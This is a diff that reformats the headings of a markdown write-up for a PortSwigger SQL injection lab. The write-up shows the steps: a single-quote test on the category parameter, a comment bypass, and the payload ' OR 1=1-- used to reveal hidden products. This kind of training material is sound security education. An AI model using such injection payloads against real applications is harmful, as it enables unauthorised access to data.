@@ -7,20 +7,20 @@ The application is vulnerable to SQL Injection in the category parameter, allowi
 
 **Lab Link** >>  https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
 
-# Navigate to:
+*Navigate to*
 * /filter?category=Gifts
 
-# Test input with single quote
+*Test input with single quote*
 * category=Gifts'
 → Results in SQL error (confirms injection point)
 
-# Bypass query using comment
+*Bypass query using comment*
 * category=Gifts'--
 
-# Exploit using logical condition
+*Exploit using logical condition*
 * category=Gifts' OR 1=1--
 
-# Payload Used
+*Payload Used*
 '+or+1=1--
 
 # Impact
